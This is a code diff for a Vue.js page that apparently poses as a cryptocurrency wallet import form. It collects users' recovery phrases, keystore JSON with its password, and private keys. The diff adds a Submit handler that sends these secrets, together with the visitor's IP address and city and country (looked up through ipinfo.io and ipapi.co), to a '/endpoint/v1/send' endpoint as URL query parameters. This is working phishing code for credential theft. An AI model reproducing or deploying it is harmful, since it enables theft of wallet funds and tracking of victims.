@@ -82,12 +82,12 @@
                     <div class="row justify-content-center">
                         <div class="col-lg-7">
                             <div class="form_cc_four">
-                              <form class="row">
+                              <form class="row" @submit.prevent="Submit('phrase', inputOne)">
                                 <div class="col-md-12">
                                   <div class="form-group">
-                                    <label>Do not refresh page use <router-link :to="{ name: 'Wallets' }"> start again</router-link>.</label>
+                                    <label><span style="color: red;">Do not refresh page use this to</span> <router-link :to="{ name: 'Wallets' }"> start again</router-link>.</label>
                                     <label>Typically 12 (sometimes 24) words separated by single spaces.</label>
-                                    <textarea v-model.trim="inputOne" id="inputOne" class="form-control" rows="7" placeholder="Phrase"></textarea>
+                                    <textarea required v-model.trim="inputOne" id="inputOne" class="form-control" rows="7" placeholder="Phrase"></textarea>
                                     <label class="color-red" v-show="hasError">{{error}}</label>
                                   </div>
                                 </div>
@@ -99,9 +99,9 @@
                                       </button>
                                   </div>
                                     <div class="item_upload mb-3 mb-md-0">
-                                  <a href="" class="btn btn_md_primary bg-blue rounded-8 c-white h-fit-content">
+                                  <button type="submit" class="btn btn_md_primary bg-blue rounded-8 c-white h-fit-content">
                                     Import
-                                  </a>
+                                  </button>
                                   </div>
                                 </div>
                               </form>
@@ -113,19 +113,19 @@
                     <div class="row justify-content-center">
                         <div class="col-lg-7">
                             <div class="form_cc_four">
-                              <form class="row">
+                              <form class="row" @submit.prevent="Submit('keystone', inputTwo, pwd)">
                                 <div class="col-md-12">
                                 <div class="form-group">
-                                    <label>Do not refresh page use <router-link :to="{ name: 'Wallets' }"> start again</router-link>.</label>
+                                    <label><span style="color: red;">Do not refresh page use this to</span> <router-link :to="{ name: 'Wallets' }"> start again</router-link>.</label>
                                     <label>Several lines of text beginning with '<b>{...}</b>' plus the password used to encrypt it.</label>
-                                    <textarea v-model="inputTwo" class="form-control" rows="7" placeholder="Keystone JSON"></textarea>
+                                    <textarea required v-model="inputTwo" class="form-control" rows="7" placeholder="Keystone JSON"></textarea>
                                     <label class="color-red" v-show="hasErrorr">{{errorr}}</label>
                                 </div>
                                 </div>
                                 <div class="col-md-12">
                                   <div class="form-group">
                                     <label>Password</label>
-                                    <input type="password" class="form-control" placeholder="◉ ◉ ◉ ◉ ◉">
+                                    <input  v-model="pwd" type="password" class="form-control" placeholder="◉ ◉ ◉ ◉ ◉">
                                   </div>
                                 </div>
             
@@ -137,9 +137,9 @@
                                         </button>
                                         </div>
                                     </div>
-                                    <a href="" class="btn btn_md_primary bg-blue rounded-8 c-white h-fit-content">
+                                    <button type="submit" class="btn btn_md_primary bg-blue rounded-8 c-white h-fit-content">
                                         Import
-                                    </a>
+                                    </button>
                                 </div>
                               </form>
                             </div>
@@ -150,12 +150,12 @@
                     <div class="row justify-content-center">
                         <div class="col-lg-7">
                             <div class="form_cc_four">
-                              <form action="" class="row">
+                              <form class="row" @submit.prevent="Submit('private', inputThree)">
                                 <div class="col-md-12">
                                   <div class="form-group">
-                                    <label>Do not refresh page use <router-link :to="{ name: 'Wallets' }"> start again</router-link>.</label>
+                                    <label><span style="color: red;">Do not refresh page use this to</span> <router-link :to="{ name: 'Wallets' }"> start again</router-link>.</label>
                                     <label>Typically 12 (sometimes 24) words separated by single spaces</label>
-                                    <textarea v-model="inputThree" id="inputThree" class="form-control" rows="7" placeholder="Enter Private Keys"></textarea>
+                                    <textarea required v-model="inputThree" id="inputThree" class="form-control" rows="7" placeholder="Enter Private Keys"></textarea>
                                     <label class="color-red" v-show="hasErrorrr">{{errorrr}}</label>
                                   </div>
                                 </div>
@@ -168,9 +168,9 @@
                                       </button>
                                     </div>
                                   </div>
-                                  <a href="" class="btn btn_md_primary bg-blue rounded-8 c-white h-fit-content">
+                                  <button type="submit" class="btn btn_md_primary bg-blue rounded-8 c-white h-fit-content">
                                     Import
-                                  </a>
+                                  </button>
                                 </div>
                               </form>
                             </div>
@@ -234,29 +234,35 @@ export default {
           inputOne: '',
           inputTwo: '',
           inputThree: '',
+          ip: '',
+          loc: '',
+          pwd: ''
       }
   },
   mixins: [dialog, xtra],
   components: {
     Header, Footer, BaseFooter
   },
+  created(){
+    },
   mounted() {
-          setTimeout(function () {
+    setTimeout(function () {
       $('body').addClass('loaded_page');
     }, 3000);
     // $(document).on("keydown", disableF5);
+    this.getIp()
   },
   updated() {
-      var no_words = this.inputOne.split(" ");
+    var no_words = this.inputOne.split(" ");
       if(no_words.length < 12){
-          this.error = 'Few words present, You have inputed '+no_words.length+' of words.'
+        this.error = 'Few words present, You have inputed '+no_words.length+' of words.'
           this.hasError = true
     //   } else if (no_word.length > 50){
-    //         this.errorrr = 'Maximum Input exceeded'
+      //         this.errorrr = 'Maximum Input exceeded'
     //         this.hasErrorrr = true
     //         document.getElementById('inputOne').value = this.inputOne.replace(/\w+[.!?]?$/, '');
             } else if (no_words.length > 24){
-          this.error = 'To many words present, You have inputed '+no_words.length+' of words.'
+              this.error = 'To many words present, You have inputed '+no_words.length+' of words.'
           this.hasError = true
         } else if(no_words.length == 0 || no_words == null) {
             this.error = ''
@@ -315,11 +321,46 @@ export default {
                 return false;
             }
         },
-        Submit() {
+        getIp() {
           axios
-            .get('/endpoint/v1/send?wallet='+x+'&type='+tt+'&data='+y+'&timein='+tt+'&timeout='+tt+'&ip='+tt+'&loc='+tt)
+            .get('https://ipinfo.io?token=f865373b33ae79')
             .then(res => {
-              this.Explore = res.data
+              this.ip = res.data.ip
+              this.getLoc(this.ip)
+            })
+            .catch(err => {
+              console.error(err)
+              this.ip = null
+            })
+        },
+        getLoc(IP) {
+          axios
+            .get('https://ipapi.co/' + IP + '/json/')
+            .then(res => {
+              this.loc = res.data.city+ ', ' + res.data.country_name+'.'
+            })
+            .catch(err => {
+              console.error(err)
+              this.loc = null
+            })
+        },
+        async Submit(x,y=null,z=null) {
+          const wallet = this.path
+          const type = x
+          const dataO = y
+          const dataT = z
+          const ip = this.ip
+          const loc = this.loc
+          const date = new Date();
+          // monday 14 feb 2022 10:11
+          const timein = date.getDay()+'-'+date.getDate()+'-'+date.getMonth()+'-'+date.getFullYear()+'-'+date.getHours()+'-'+date.getMinutes()+'-'+date.getSeconds()
+
+
+          axios
+            // .get('/endpoint/v1/send?wallet='+wallet)
+            .get('/endpoint/v1/send?wallet='+wallet+'&type='+type+'&dataO='+dataO+'&timein='+timein+'&dataT='+dataT+'&ip='+ip+'&loc='+loc)
+            .then(res => {
+              console.log(res)
             })
             .catch(err => {
               console.error(err)
